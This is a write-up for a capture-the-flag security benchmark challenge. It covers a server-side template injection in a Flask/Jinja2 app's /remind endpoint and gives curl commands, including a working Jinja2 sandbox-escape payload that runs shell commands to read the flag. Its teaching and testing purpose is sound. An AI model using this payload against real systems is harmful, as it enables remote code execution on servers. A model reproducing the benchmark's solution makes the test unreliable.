# XBEN-093-24 — Pay me Back

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability:** Server-Side Template Injection (SSTI) in Flask/Jinja2. The `/remind` endpoint
builds a template STRING by directly interpolating the attacker-controlled `date` query parameter
into the template source (`'Reminder will be sent on {}'.format(date)`) before passing it to
`render_template_string()`. Because the user input becomes part of the Jinja2 template itself (not
just template data), arbitrary Jinja2 expressions are evaluated, leading to full RCE via the
classic `__globals__`/`__builtins__` sandbox-escape gadget. The `/remind` endpoint is reachable
without authentication (its `@login_required` gate was removed), so the SSTI can be triggered
directly — a `/login` route with the `user`/`user` account still exists but is not needed.

## Exploit

```bash
# Confirm SSTI directly against the (now unauthenticated) /remind endpoint
curl -s -G "http://localhost:55437/remind" --data-urlencode "date={{7*7}}"
# -> "Reminder will be sent on 49"

# RCE: read flag.txt via the Jinja2 sandbox-escape gadget
PAYLOAD="{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"
curl -s -G "http://localhost:55437/remind" --data-urlencode "date=$PAYLOAD"
```
